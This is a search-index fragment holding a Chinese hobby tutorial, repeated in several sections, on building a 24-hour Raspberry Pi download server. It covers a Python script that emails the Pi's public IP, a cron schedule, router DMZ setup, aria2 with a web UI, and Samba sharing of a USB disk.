\u901a\u8fc7\u8bbf\u95ee\u91c7\u96c6 http://members.3322.org/dyndns/getip \u83b7\u53d6\u5230\u516c\u7f51IP\u5730\u5740\uff0c\u7136\u540e\u501f\u7528163\u90ae\u7bb1\u7ed9\u81ea\u5df1\u7684QQ\u90ae\u7bb1\u53d1\u4fe1\u3002\uff08\u53d1\u4ef6\u548c\u6536\u4ef6\u90ae\u7bb1\u4e00\u81f4\u4e5f\u53ef\u4ee5\uff0c\u4e3b\u8981\u8003\u8651163\u90ae\u7bb1\u8bbe\u7f6eSMTP\u65b9\u4fbf\uff0cQQ\u53ef\u4ee5\u81ea\u52a8\u5f39\u51fa\u90ae\u4ef6\u901a\u77e5\u3002\uff09 #!/usr/bin/python # -*- coding: UTF-8 -*- import smtplib import string from email.MIMEMultipart import MIMEMultipart from email.MIMEText import MIMEText import urllib import urllib2 user_agent = 'Mozilla/4.0 (compatible; MSIE 10.0; Windows NT)' headers = {} headers['User-Agent'] = user_agent url = 'http://members.3322.org/dyndns/getip' # \u901a\u8fc7\u8fd9\u4e2a\u63a5\u53e3\u83b7\u53d6\u516c\u7f51IP\u5730\u5740 req = urllib2.Request(url, headers = headers) res = urllib2.urlopen(req) ip = string.strip(res.read()) # \u53bb\u9664\u7a7a\u683c print ip fromaddr = \"xiangyangqiaomu@163.com\" # \u586b\u5199\u4f60\u7684\u53d1\u4fe1\u90ae\u7bb1\uff0c\u6211\u9009\u7528\u7684\u662f163\u90ae\u7bb1 toaddr = \"85378058@qq.com\" # \u586b\u5199\u4f60\u7684\u6536\u4fe1\u5730\u5740\uff0c\u63a5\u6536\u6811\u8393\u6d3e\u7684\u516c\u7f51IP\u5730\u5740 msg = MIMEMultipart() msg['From'] = fromaddr msg['To'] = toaddr msg['Subject'] = 'rasperberry IP is ' + ip # \u90ae\u4ef6\u6807\u9898 body = 'rasperberry IP is ' + ip # \u90ae\u4ef6\u5185\u5bb9\uff0c\u540c\u6807\u9898\uff08\u5077\u61d2\uff09 msg.attach(MIMEText(body, 'plain')) server = smtplib.SMTP('smtp.163.com', 25) # \u586b\u5199163\u90ae\u7bb1\u7684\u53d1\u4fe1\u670d\u52a1\u5668\u5730\u5740 server.starttls() server.login(fromaddr, \"xxx\") # xxx\u4ee3\u8868\u4f60\u7684\u90ae\u4ef6\u767b\u5f55\u5bc6\u7801 text = msg.as_string() server.sendmail(fromaddr, toaddr, text) # \u5f00\u59cb\u53d1\u90ae\u4ef6 print u\"send ok\" # \u53d1\u9001\u6210\u529f\u63d0\u793a server.quit() \u8fd0\u884c\u8fd9\u4e2apython\u6587\u4ef6\u540e\u5c31\u53d1\u4fe1\u6210\u529f\u4e86\u3002\uff08\u6ce8\u610f\uff0c\u5343\u4e07\u4e0d\u8981\u628a\u8fd9\u4e2apython\u6587\u4ef6\u547d\u540d\u4e3aemail.py\uff0c\u4f1a\u62a5\u9519\uff0c\u6362\u4e2a\u540d\u5b57\uff0c\u6bd4\u5982\u53ebsendemail.py\uff09 \ufffc \u5982\u4f55\u5b9a\u65f6\u8fd0\u884c\u8fd9\u4e2a\u7a0b\u5e8f\u53d1\u90ae\u4ef6\u5462\uff1f \u9700\u8981\u5148\u5199\u4e00\u4e2a\u6267\u884c\u8fd9\u4e2a\u7a0b\u5e8f\u7684\u811a\u672c\uff0c\u4ee3\u7801\u5982\u4e0b\uff1a #!/bin/sh python /home/pi/code/sendemail.py \u5b58\u4e2a\u540d\u5b57\u53eb getip.sh \u5728\u6811\u8393\u6d3e\u7684\u7ec8\u7aef\u91cc\u8f93\u5165 crontab -e \u8fd9\u4e2a\u662f\u7cfb\u7edf\u81ea\u5e26\u7684\u5b9a\u65f6\u7a0b\u5e8f\uff0c\u5177\u4f53\u7528\u6cd5\u53ef\u4ee5Google \u8fd9\u65f6\u4f1a\u8fdb\u5165\u7f16\u8f91\u754c\u9762\uff0c\u8f93\u5165\u5982\u4e0b\u4ee3\u7801\uff08\u610f\u601d\u662f\u6bcf\u969430\u5206\u949f\u6267\u884c\u4e00\u6b21getip.sh\u8fd9\u4e2a\u811a\u672c\uff09 */30 * * * * /home/pi/code/getip.sh \u8fd9\u6837\uff0c\u6bcf\u969430\u5206\u949f\u4f60\u7684\u90ae\u7bb1\u91cc\u5c31\u4f1a\u6709\u4e00\u5c01\u544a\u77e5\u4f60\u73b0\u5728\u6811\u8393\u6d3e\u516c\u7f51IP\u7684\u90ae\u4ef6\u3002 \u5982\u4f55\u6539\u9020\u6210\u4e0b\u8f7d\u673a\u5462\uff1f \u6709\u4e86\u516c\u7f51IP\u5730\u5740\uff0c\u5c31\u53ef\u4ee5\u8fdc\u7a0b\u901a\u8fc7SSH\u767b\u5f55\u5230\u6811\u8393\u6d3e\u4e3b\u673a\u4e86\uff0c\u53ef\u5982\u4f55\u53d8\u6210\u4e0b\u8f7d\u673a\u5462\uff1f \u8fd9\u65f6Linux\u4e0b\u6700\u5f3a\u5927\u7684\u4e0b\u8f7d\u5de5\u5177Aria2\u5c31\u8981\u51fa\u573a\u4e86\u3002 \u636e\u8bf4\u53ef\u4ee5\u4e0b\u8f7d\u767e\u5ea6\u4e91\uff0c\u8fc5\u96f7\u79bb\u7ebf\u4e2d\u7684\u8d44\u6e90\uff0c\u652f\u6301http/https/ftp/bt\u534f\u8bae\uff0c\u652f\u6301metalink 3.0\uff0cmetalink\u662f\u4e00\u79cd\u53ef\u4ee5\u5c06\u4e0d\u540c\u534f\u8bae\u4e0b\u8f7d\u7684\u540c\u4e00\u6587\u4ef6\u96c6\u5408\u5230\u4e00\u8d77\u4ee5\u8fbe\u5230\u6700\u5927\u4e0b\u8f7d\u7a33\u5b9a\u6027\u548c\u901f\u5ea6\u7684\u4e1c\u897f\u3002 \u5b89\u88c5\u914d\u7f6e\u53c2\u8003\u8fd9\u7bc7\u6587\u7ae0\uff1a Raspberry Pi\u4ece\u96f6\u5f00\u59cb\u642d\u5efa\u4f4e\u6210\u672cNAS(7)-Aria2\u8fdc\u7a0b\u4e0b\u8f7d \u6309\u7167\u6b65\u9aa4\u4e00\u6b65\u6b65\u64cd\u4f5c\uff0c\u6bd4\u8f83\u987a\u5229\u3002 \u6700\u540e\u8fd8\u5b89\u88c5\u4e86webui-aria2\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u901a\u8fc7Web\u754c\u9762\u65b9\u5f0f\u6dfb\u52a0\u4e0b\u8f7d\u4efb\u52a1\u4e86\u3002 \u6ce8\u610f\uff1aWeb\u670d\u52a1\u5668\u53ef\u4ee5\u9009\u62e9Apache\u6216Nginx\u90fd\u53ef\u4ee5\uff0c\u4f46\u914d\u7f6e\u7aef\u53e3\u7684\u65f6\u5019\u4e00\u5b9a\u4e0d\u8981\u752880\u62168080\uff0c\u56e0\u4e3a\u90fd\u88ab\u8054\u901a\u5c01\u6389\u4e86\u3002 \ufffc \u70b9\u51fb\u6dfb\u52a0\u5c31\u53ef\u4ee5\u521b\u5efa\u4e0d\u540c\u534f\u8bae\u7684\u4e0b\u8f7d\u4efb\u52a1\uff0chttp/ftp\u548c\u78c1\u529b\u94fe\u90fd\u9009\u94fe\u63a5\u4e0b\u8f7d\uff0c\u4e5f\u53ef\u4ee5\u4e0a\u4f20BT\u79cd\u5b50\u4e0b\u8f7d\u3002 \u7535\u5f71\u4e0b\u8f7d\u63a8\u8350: LOL\u7535\u5f71\u5929\u5802 \u8ba9\u95f2\u7f6e\u7684\u79fb\u52a8\u786c\u76d8\u8dd1\u8d77\u6765 \u6811\u8393\u6d3e\u7684\u7cfb\u7edf\u662f\u5b89\u88c5\u5728SD\u5361\u91cc\uff0c\u5bb9\u91cf\u53ea\u670932G\uff0c\u901f\u5ea6\u4e5f\u4e0d\u5feb\u3002\u521a\u597d\u60f3\u8d77\u6765\u6211\u8fd8\u6709\u5757\u95f2\u7f6e\u4e86\u5feb10\u5e74\u7684500G\u79fb\u52a8\u786c\u76d8\u3002 \u770b\u4e86\u5f88\u591a\u6587\u7ae0\u90fd\u8bf4\u6811\u8393\u6d3e\u5e26\u4e0d\u8d77\u6765\u79fb\u52a8\u786c\u76d8\uff0c\u56e0\u4e3a\u7535\u538b\u4e0d\u591f\uff0c\u9700\u8981\u5916\u63a5\u7535\u6e90\u6216\u4f7f\u7528\u5e26\u7535\u6e90\u7684USB Hub\u3002 \u4f46\u6211\u5c1d\u8bd5\u628a\u79fb\u52a8\u786c\u76d8\u63d2\u4e0a\u53bb\u7684\u65f6\u5019\uff0c\u5c45\u7136\u53ef\u4ee5\u8bc6\u522b\u800c\u4e14\u8fd0\u8f6c\u826f\u597d\u3002\u53ef\u80fd\u6811\u8393\u6d3e3b+\u5347\u7ea7\u4e86\uff1f \u53c2\u8003\u6559\u7a0b\u5b89\u88c5\u4e86Samba\u4ee5\u5b9e\u73b0\u6587\u4ef6\u5171\u4eab\uff1a http://www.cnblogs.com/xiaowuyi/p/4051238.html \u6ce8\u610f\u4e8b\u9879\uff1a \u5efa\u8bae\u628a\u79fb\u52a8\u786c\u76d8\u7684\u67d0\u4e2a\u5206\u533a\u683c\u5f0f\u5316\u4e3aext4\u683c\u5f0f\uff0c\u5426\u5219aria2\u4e0b\u8f7d\u65e0\u6cd5\u5199\u5165\u3002 \u5982\u679c\u6709\u5206\u533a\u662fNTFS\u683c\u5f0f\u7684\uff0c\u9700\u8981\u88c5\u8f6f\u4ef6 sudo apt-get install fuse-utils ntfs-3g \u5426\u5219\u5206\u533a\u662f\u53ea\u8bfb\u72b6\u6001\u3002 \u63d2\u4e0a\u53bb\u79fb\u52a8\u786c\u76d8\u6216U\u76d8\u662f\u4e0d\u80fd\u76f4\u63a5\u7528\u7684\uff0c\u9700\u8981\u6302\u8f7d\u3002 \u6559\u7a0b\u5730\u5740 \u5b89\u88c5\u8bbe\u7f6e\u597dSamba\u670d\u52a1\u540e\uff0c\u7535\u8111\u4e5f\u53ef\u4ee5\u8bbf\u95ee\u5230\u79fb\u52a8\u786c\u76d8\u4e86\u3002 \u5982\u679c\u662fMac\u7535\u8111\uff0c\u6253\u5f00Finder -> \u524d\u5f80 -> \u8fde\u63a5\u670d\u52a1\u5668\uff0c\u7136\u540e\u8f93\u5165 smb://user@xxx.xxx.xxx.xxx \u8fd9\u65f6\u4f1a\u8981\u6c42\u8f93\u5165smba\u7528\u6237\u5bc6\u7801\uff0c\u7136\u540e\u5c31\u767b\u5f55\u6210\u529f\u4e86\uff0c\u4ee5\u540e\u8fdc\u7a0b\u5c31\u53ef\u4ee5\u8bbf\u95ee\u81ea\u5df1\u7684\u79fb\u52a8\u786c\u76d8\u4e86\uff0c\u751a\u81f3\u53ef\u4ee5\u76f4\u63a5\u64ad\u653e\u89c6\u9891\u3002 \u200b \u7f16\u8f91\u4e8e 2016-07-02 01:35 \u6811\u8393\u6d3e\uff08Raspberry Pi\uff09 Python \u5165\u95e8 \u6781\u5ba2\uff08Geek\uff09 \u200b\u8d5e\u540c 682\u200b\u200b62 \u6761\u8bc4\u8bba\u200b\u5206\u4eab\u200b\u559c\u6b22\u200b\u6536\u85cf\u200b\u7533\u8bf7\u8f6c\u8f7d\u200b \u539f\u6587\u94fe\u63a5\uff1a https://zhuanlan.zhihu.com/p/21471896","title":"\u628a\u6811\u8393\u6d3e\u53d8\u621024\u5c0f\u65f6\u8fd0\u884c\u7684\u4e0b\u8f7d\u795e\u5668\uff08\u79cd\u5b50\u3001\u78c1\u529b\u94fe\u901a\u901a\u652f\u6301\uff09"},{"location":"RPI/%E6%8A%8A%E6%A0%91%E8%8E%93%E6%B4%BE%E5%8F%98%E6%88%9024%E5%B0%8F%E6%97%B6%E8%BF%90%E8%A1%8C%E7%9A%84%E4%B8%8B%E8%BD%BD%E7%A5%9E%E5%99%A8%EF%BC%88%E7%A7%8D%E5%AD%90%E3%80%81%E7%A3%81%E5%8A%9B%E9%93%BE%E9%80%9A%E9%80%9A%E6%94%AF%E6%8C%81%EF%BC%89/#24","text":"","title":"\u628a\u6811\u8393\u6d3e\u53d8\u621024\u5c0f\u65f6\u8fd0\u884c\u7684\u4e0b\u8f7d\u795e\u5668\uff08\u79cd\u5b50\u3001\u78c1\u529b\u94fe\u901a\u901a\u652f\u6301\uff09"},{"location":"RPI/%E6%8A%8A%E6%A0%91%E8%8E%93%E6%B4%BE%E5%8F%98%E6%88%9024%E5%B0%8F%E6%97%B6%E8%BF%90%E8%A1%8C%E7%9A%84%E4%B8%8B%E8%BD%BD%E7%A5%9E%E5%99%A8%EF%BC%88%E7%A7%8D%E5%AD%90%E3%80%81%E7%A3%81%E5%8A%9B%E9%93%BE%E9%80%9A%E9%80%9A%E6%94%AF%E6%8C%81%EF%BC%89/#24_1","text":"\u6811\u8393\u6d3e\u4e70\u56de\u6765\u540e\u5e72\u4ec0\u4e48\u5462\uff1f\u5148\u9a71\u4eec\u544a\u8bc9\u6211\uff1a\u73a9\u51e0\u5929\u5c31\u817b\u4e86\uff0c\u7b49\u7740\u653e\u7284\u89d2\u65ee\u65ef\u91cc\u5403\u7070\u5427\u3002 \u6211\u7814\u7a76\u4e86\u77e5\u4e4e\u4e0a\u7684 \u6811\u8393\u6d3e\u73a9\u6cd5\u5927\u5168 \uff0c\u53d1\u73b0\u5982\u679c\u6ca1\u6709\u4e70\u5176\u4ed6\u6269\u5c55\u786c\u4ef6\u7684\u8bdd\uff0c\u7528\u6811\u8393\u6d3e\u642d\u5efa\u4e00\u4e2a24\u5c0f\u65f6\u5f00\u673a\u7684\u4e0b\u8f7d\u670d\u52a1\u5668\u662f\u4e2a\u4e0d\u9519\u7684\u9009\u62e9\u3002","title":"\u628a\u6811\u8393\u6d3e\u53d8\u621024\u5c0f\u65f6\u8fd0\u884c\u7684\u4e0b\u8f7d\u795e\u5668\uff08\u79cd\u5b50\u3001\u78c1\u529b\u94fe\u901a\u901a\u652f\u6301\uff09"},{"location":"RPI/%E6%8A%8A%E6%A0%91%E8%8E%93%E6%B4%BE%E5%8F%98%E6%88%9024%E5%B0%8F%E6%97%B6%E8%BF%90%E8%A1%8C%E7%9A%84%E4%B8%8B%E8%BD%BD%E7%A5%9E%E5%99%A8%EF%BC%88%E7%A7%8D%E5%AD%90%E3%80%81%E7%A3%81%E5%8A%9B%E9%93%BE%E9%80%9A%E9%80%9A%E6%94%AF%E6%8C%81%EF%BC%89/#_1","text":"\u65e2\u7136\u662f\u4e0b\u8f7d\u670d\u52a1\u5668\u5c31\u4e0d\u80fd\u53ea\u5728\u5bb6\u91cc\u4f7f\u7528\uff0c\u9700\u8981\u652f\u6301\u8fdc\u7a0b\u8bbf\u95ee\u3002\u90a3\u4e48\u95ee\u9898\u6765\u4e86\uff0c\u76ee\u524d\u5bb6\u91cc\u5b89\u88c5\u7684\u90fd\u662f\u8054\u901a\u7684ADSL\uff0c\u516c\u7f51IP\u662f\u7ecf\u5e38\u53d1\u751f\u53d8\u5316\u7684\uff0c\u5982\u4f55\u5b9e\u65f6\u83b7\u53d6\u5bb6\u91cc\u6811\u8393\u6d3e\u7684IP\u5730\u5740\u8fdb\u884c\u8bbf\u95ee\u5462\uff1f \u89e3\u51b3\u529e\u6cd5\u5982\u4e0b\uff1a \u9996\u5148\u767b\u5f55\u5bb6\u91cc\u7684\u8def\u7531\u5668\uff0c\u7ed9\u6811\u8393\u6d3e\u6307\u5b9a\u4e00\u4e2a\u56fa\u5b9a\u7684\u9759\u6001\u5185\u7f51IP\u5730\u5740\u3002 \ufffc \u4f7f\u7528\u8def\u7531\u5668\u91cc\u7684DHCP\u9759\u6001IP\u5206\u914d\u529f\u80fd\u6307\u5b9aIP\u5730\u5740\uff08\u57fa\u672c\u6240\u6709\u8def\u7531\u5668\u90fd\u6709\u8fd9\u4e2a\u529f\u80fd\uff0c\u4f46\u83dc\u5355\u4f4d\u7f6e\u4e0d\u4e00\u6837\uff09 \u8fd9\u91cc\u6211\u8bbe\u7f6e\u4e86192.168.31.88 \u4f5c\u4e3a\u6811\u8393\u6d3e\u7684\u9759\u6001\u5185\u7f51IP\u5730\u5740\u3002 \u7136\u540e\u5f00\u542f\u8def\u7531\u5668\u91cc\u7684DMZ\u529f\u80fd\uff0c\u6307\u5411\u8fd9\u4e2a\u9759\u6001IP\u5730\u5740\uff0c\u8fd9\u6837\u901a\u8fc7\u516c\u7f51IP\u5c31\u80fd\u8bbf\u95ee\u5230\u6811\u8393\u6d3e\u4e86\u3002 \ufffc\ufffc \u90a3\u5982\u4f55\u5b9e\u65f6\u83b7\u53d6\u516c\u7f51\u5730\u5740\u5462\uff1f \u5199\u4e86\u4e0b\u9762\u4e00\u6bb5Python\u4ee3\u7801\uff0c\u5b9e\u73b0\u7684\u65b9\u6cd5\u662f\uff1a \u901a\u8fc7\u8bbf\u95ee\u91c7\u96c6 http://members.3322.org/dyndns/getip \u83b7\u53d6\u5230\u516c\u7f51IP\u5730\u5740\uff0c\u7136\u540e\u501f\u7528163\u90ae\u7bb1\u7ed9\u81ea\u5df1\u7684QQ\u90ae\u7bb1\u53d1\u4fe1\u3002\uff08\u53d1\u4ef6\u548c\u6536\u4ef6\u90ae\u7bb1\u4e00\u81f4\u4e5f\u53ef\u4ee5\uff0c\u4e3b\u8981\u8003\u8651163\u90ae\u7bb1\u8bbe\u7f6eSMTP\u65b9\u4fbf\uff0cQQ\u53ef\u4ee5\u81ea\u52a8\u5f39\u51fa\u90ae\u4ef6\u901a\u77e5\u3002\uff09 #!/usr/bin/python # -*- coding: UTF-8 -*- import smtplib import string from email.MIMEMultipart import MIMEMultipart from email.MIMEText import MIMEText import urllib import urllib2 user_agent = 'Mozilla/4.0 (compatible; MSIE 10.0; Windows NT)' headers = {} headers['User-Agent'] = user_agent url = 'http://members.3322.org/dyndns/getip' # \u901a\u8fc7\u8fd9\u4e2a\u63a5\u53e3\u83b7\u53d6\u516c\u7f51IP\u5730\u5740 req = urllib2.Request(url, headers = headers) res = urllib2.urlopen(req) ip = string.strip(res.read()) # \u53bb\u9664\u7a7a\u683c print ip fromaddr = \"xiangyangqiaomu@163.com\" # \u586b\u5199\u4f60\u7684\u53d1\u4fe1\u90ae\u7bb1\uff0c\u6211\u9009\u7528\u7684\u662f163\u90ae\u7bb1 toaddr = \"85378058@qq.com\" # \u586b\u5199\u4f60\u7684\u6536\u4fe1\u5730\u5740\uff0c\u63a5\u6536\u6811\u8393\u6d3e\u7684\u516c\u7f51IP\u5730\u5740 msg = MIMEMultipart() msg['From'] = fromaddr msg['To'] = toaddr msg['Subject'] = 'rasperberry IP is ' + ip # \u90ae\u4ef6\u6807\u9898 body = 'rasperberry IP is ' + ip # \u90ae\u4ef6\u5185\u5bb9\uff0c\u540c\u6807\u9898\uff08\u5077\u61d2\uff09 msg.attach(MIMEText(body, 'plain')) server = smtplib.SMTP('smtp.163.com', 25) # \u586b\u5199163\u90ae\u7bb1\u7684\u53d1\u4fe1\u670d\u52a1\u5668\u5730\u5740 server.starttls() server.login(fromaddr, \"xxx\") # xxx\u4ee3\u8868\u4f60\u7684\u90ae\u4ef6\u767b\u5f55\u5bc6\u7801 text = msg.as_string() server.sendmail(fromaddr, toaddr, text) # \u5f00\u59cb\u53d1\u90ae\u4ef6 print u\"send ok\" # \u53d1\u9001\u6210\u529f\u63d0\u793a server.quit() \u8fd0\u884c\u8fd9\u4e2apython\u6587\u4ef6\u540e\u5c31\u53d1\u4fe1\u6210\u529f\u4e86\u3002\uff08\u6ce8\u610f\uff0c\u5343\u4e07\u4e0d\u8981\u628a\u8fd9\u4e2apython\u6587\u4ef6\u547d\u540d\u4e3aemail.py\uff0c\u4f1a\u62a5\u9519\uff0c\u6362\u4e2a\u540d\u5b57\uff0c\u6bd4\u5982\u53ebsendemail.py\uff09 \ufffc","title":"\u9047\u5230\u7684\u96be\u70b9\u548c\u89e3\u51b3\u529e\u6cd5"},{"location":"RPI/%E6%8A%8A%E6%A0%91%E8%8E%93%E6%B4%BE%E5%8F%98%E6%88%9024%E5%B0%8F%E6%97%B6%E8%BF%90%E8%A1%8C%E7%9A%84%E4%B8%8B%E8%BD%BD%E7%A5%9E%E5%99%A8%EF%BC%88%E7%A7%8D%E5%AD%90%E3%80%81%E7%A3%81%E5%8A%9B%E9%93%BE%E9%80%9A%E9%80%9A%E6%94%AF%E6%8C%81%EF%BC%89/#_2","text":"\u9700\u8981\u5148\u5199\u4e00\u4e2a\u6267\u884c\u8fd9\u4e2a\u7a0b\u5e8f\u7684\u811a\u672c\uff0c\u4ee3\u7801\u5982\u4e0b\uff1a #!/bin/sh python /home/pi/code/sendemail.py \u5b58\u4e2a\u540d\u5b57\u53eb getip.sh \u5728\u6811\u8393\u6d3e\u7684\u7ec8\u7aef\u91cc\u8f93\u5165 crontab -e \u8fd9\u4e2a\u662f\u7cfb\u7edf\u81ea\u5e26\u7684\u5b9a\u65f6\u7a0b\u5e8f\uff0c\u5177\u4f53\u7528\u6cd5\u53ef\u4ee5Google \u8fd9\u65f6\u4f1a\u8fdb\u5165\u7f16\u8f91\u754c\u9762\uff0c\u8f93\u5165\u5982\u4e0b\u4ee3\u7801\uff08\u610f\u601d\u662f\u6bcf\u969430\u5206\u949f\u6267\u884c\u4e00\u6b21getip.sh\u8fd9\u4e2a\u811a\u672c\uff09 */30 * * * * /home/pi/code/getip.sh \u8fd9\u6837\uff0c\u6bcf\u969430\u5206\u949f\u4f60\u7684\u90ae\u7bb1\u91cc\u5c31\u4f1a\u6709\u4e00\u5c01\u544a\u77e5\u4f60\u73b0\u5728\u6811\u8393\u6d3e\u516c\u7f51IP\u7684\u90ae\u4ef6\u3002","title":"\u5982\u4f55\u5b9a\u65f6\u8fd0\u884c\u8fd9\u4e2a\u7a0b\u5e8f\u53d1\u90ae\u4ef6\u5462\uff1f"},{"location":"RPI/%E6%8A%8A%E6%A0%91%E8%8E%93%E6%B4%BE%E5%8F%98%E6%88%9024%E5%B0%8F%E6%97%B6%E8%BF%90%E8%A1%8C%E7%9A%84%E4%B8%8B%E8%BD%BD%E7%A5%9E%E5%99%A8%EF%BC%88%E7%A7%8D%E5%AD%90%E3%80%81%E7%A3%81%E5%8A%9B%E9%93%BE%E9%80%9A%E9%80%9A%E6%94%AF%E6%8C%81%EF%BC%89/#_3","text":"\u6709\u4e86\u516c\u7f51IP\u5730\u5740\uff0c\u5c31\u53ef\u4ee5\u8fdc\u7a0b\u901a\u8fc7SSH\u767b\u5f55\u5230\u6811\u8393\u6d3e\u4e3b\u673a\u4e86\uff0c\u53ef\u5982\u4f55\u53d8\u6210\u4e0b\u8f7d\u673a\u5462\uff1f \u8fd9\u65f6Linux\u4e0b\u6700\u5f3a\u5927\u7684\u4e0b\u8f7d\u5de5\u5177Aria2\u5c31\u8981\u51fa\u573a\u4e86\u3002 \u636e\u8bf4\u53ef\u4ee5\u4e0b\u8f7d\u767e\u5ea6\u4e91\uff0c\u8fc5\u96f7\u79bb\u7ebf\u4e2d\u7684\u8d44\u6e90\uff0c\u652f\u6301http/https/ftp/bt\u534f\u8bae\uff0c\u652f\u6301metalink 3.0\uff0cmetalink\u662f\u4e00\u79cd\u53ef\u4ee5\u5c06\u4e0d\u540c\u534f\u8bae\u4e0b\u8f7d\u7684\u540c\u4e00\u6587\u4ef6\u96c6\u5408\u5230\u4e00\u8d77\u4ee5\u8fbe\u5230\u6700\u5927\u4e0b\u8f7d\u7a33\u5b9a\u6027\u548c\u901f\u5ea6\u7684\u4e1c\u897f\u3002 \u5b89\u88c5\u914d\u7f6e\u53c2\u8003\u8fd9\u7bc7\u6587\u7ae0\uff1a Raspberry Pi\u4ece\u96f6\u5f00\u59cb\u642d\u5efa\u4f4e\u6210\u672cNAS(7)-Aria2\u8fdc\u7a0b\u4e0b\u8f7d \u6309\u7167\u6b65\u9aa4\u4e00\u6b65\u6b65\u64cd\u4f5c\uff0c\u6bd4\u8f83\u987a\u5229\u3002 \u6700\u540e\u8fd8\u5b89\u88c5\u4e86webui-aria2\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u901a\u8fc7Web\u754c\u9762\u65b9\u5f0f\u6dfb\u52a0\u4e0b\u8f7d\u4efb\u52a1\u4e86\u3002 \u6ce8\u610f\uff1aWeb\u670d\u52a1\u5668\u53ef\u4ee5\u9009\u62e9Apache\u6216Nginx\u90fd\u53ef\u4ee5\uff0c\u4f46\u914d\u7f6e\u7aef\u53e3\u7684\u65f6\u5019\u4e00\u5b9a\u4e0d\u8981\u752880\u62168080\uff0c\u56e0\u4e3a\u90fd\u88ab\u8054\u901a\u5c01\u6389\u4e86\u3002 \ufffc \u70b9\u51fb\u6dfb\u52a0\u5c31\u53ef\u4ee5\u521b\u5efa\u4e0d\u540c\u534f\u8bae\u7684\u4e0b\u8f7d\u4efb\u52a1\uff0chttp/ftp\u548c\u78c1\u529b\u94fe\u90fd\u9009\u94fe\u63a5\u4e0b\u8f7d\uff0c\u4e5f\u53ef\u4ee5\u4e0a\u4f20BT\u79cd\u5b50\u4e0b\u8f7d\u3002 \u7535\u5f71\u4e0b\u8f7d\u63a8\u8350: LOL\u7535\u5f71\u5929\u5802","title":"\u5982\u4f55\u6539\u9020\u6210\u4e0b\u8f7d\u673a\u5462\uff1f"},{"location":"RPI/%E6%8A%8A%E6%A0%91%E8%8E%93%E6%B4%BE%E5%8F%98%E6%88%9024%E5%B0%8F%E6%97%B6%E8%BF%90%E8%A1%8C%E7%9A%84%E4%B8%8B%E8%BD%BD%E7%A5%9E%E5%99%A8%EF%BC%88%E7%A7%8D%E5%AD%90%E3%80%81%E7%A3%81%E5%8A%9B%E9%93%BE%E9%80%9A%E9%80%9A%E6%94%AF%E6%8C%81%EF%BC%89/#_4","text":"\u6811\u8393\u6d3e\u7684\u7cfb\u7edf\u662f\u5b89\u88c5\u5728SD\u5361\u91cc\uff0c\u5bb9\u91cf\u53ea\u670932G\uff0c\u901f\u5ea6\u4e5f\u4e0d\u5feb\u3002\u521a\u597d\u60f3\u8d77\u6765\u6211\u8fd8\u6709\u5757\u95f2\u7f6e\u4e86\u5feb10\u5e74\u7684500G\u79fb\u52a8\u786c\u76d8\u3002 \u770b\u4e86\u5f88\u591a\u6587\u7ae0\u90fd\u8bf4\u6811\u8393\u6d3e\u5e26\u4e0d\u8d77\u6765\u79fb\u52a8\u786c\u76d8\uff0c\u56e0\u4e3a\u7535\u538b\u4e0d\u591f\uff0c\u9700\u8981\u5916\u63a5\u7535\u6e90\u6216\u4f7f\u7528\u5e26\u7535\u6e90\u7684USB Hub\u3002 \u4f46\u6211\u5c1d\u8bd5\u628a\u79fb\u52a8\u786c\u76d8\u63d2\u4e0a\u53bb\u7684\u65f6\u5019\uff0c\u5c45\u7136\u53ef\u4ee5\u8bc6\u522b\u800c\u4e14\u8fd0\u8f6c\u826f\u597d\u3002\u53ef\u80fd\u6811\u8393\u6d3e3b+\u5347\u7ea7\u4e86\uff1f \u53c2\u8003\u6559\u7a0b\u5b89\u88c5\u4e86Samba\u4ee5\u5b9e\u73b0\u6587\u4ef6\u5171\u4eab\uff1a http://www.cnblogs.com/xiaowuyi/p/4051238.html \u6ce8\u610f\u4e8b\u9879\uff1a \u5efa\u8bae\u628a\u79fb\u52a8\u786c\u76d8\u7684\u67d0\u4e2a\u5206\u533a\u683c\u5f0f\u5316\u4e3aext4\u683c\u5f0f\uff0c\u5426\u5219aria2\u4e0b\u8f7d\u65e0\u6cd5\u5199\u5165\u3002 \u5982\u679c\u6709\u5206\u533a\u662fNTFS\u683c\u5f0f\u7684\uff0c\u9700\u8981\u88c5\u8f6f\u4ef6 sudo apt-get install fuse-utils ntfs-3g \u5426\u5219\u5206\u533a\u662f\u53ea\u8bfb\u72b6\u6001\u3002 \u63d2\u4e0a\u53bb\u79fb\u52a8\u786c\u76d8\u6216U\u76d8\u662f\u4e0d\u80fd\u76f4\u63a5\u7528\u7684\uff0c\u9700\u8981\u6302\u8f7d\u3002 \u6559\u7a0b\u5730\u5740 \u5b89\u88c5\u8bbe\u7f6e\u597dSamba\u670d\u52a1\u540e\uff0c\u7535\u8111\u4e5f\u53ef\u4ee5\u8bbf\u95ee\u5230\u79fb\u52a8\u786c\u76d8\u4e86\u3002 \u5982\u679c\u662fMac\u7535\u8111\uff0c\u6253\u5f00Finder -> \u524d\u5f80 -> \u8fde\u63a5\u670d\u52a1\u5668\uff0c\u7136\u540e\u8f93\u5165 smb://user@xxx.xxx.xxx.xxx \u8fd9\u65f6\u4f1a\u8981\u6c42\u8f93\u5165smba\u7528\u6237\u5bc6\u7801\uff0c\u7136\u540e\u5c31\u767b\u5f55\u6210\u529f\u4e86\uff0c\u4ee5\u540e\u8fdc\u7a0b\u5c31\u53ef\u4ee5\u8bbf\u95ee\u81ea\u5df1\u7684\u79fb\u52a8\u786c\u76d8\u4e86\uff0c\u751a\u81f3\u53ef\u4ee5\u76f4\u63a5\u64ad\u653e\u89c6\u9891\u3002 \u200b \u7f16\u8f91\u4e8e 2016-07-02 01:35 \u6811\u8393\u6d3e\uff08Raspberry Pi\uff09 Python \u5165\u95e8 \u6781\u5ba2\uff08Geek\uff09 \u200b\u8d5e\u540c 682\u200b\u200b62 \u6761\u8bc4\u8bba\u200b\u5206\u4eab\u200b\u559c\u6b22\u200b\u6536\u85cf\u200b\u7533\u8bf7\u8f6c\u8f7d\u200b \u539f\u6587\u94fe\u63a5\uff1a https://zhuanlan.zhihu.com/p/21471896","title":"\u8ba9\u95f2\u7f6e\u7684\u79fb\u52a8\u786c\u76d8\u8dd1\u8d77\u6765"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/","text":"\u6811\u8393\u6d3ewifi\u7834\u89e3[\u6574\u7406] \u786c\u4ef6\u73af\u5883 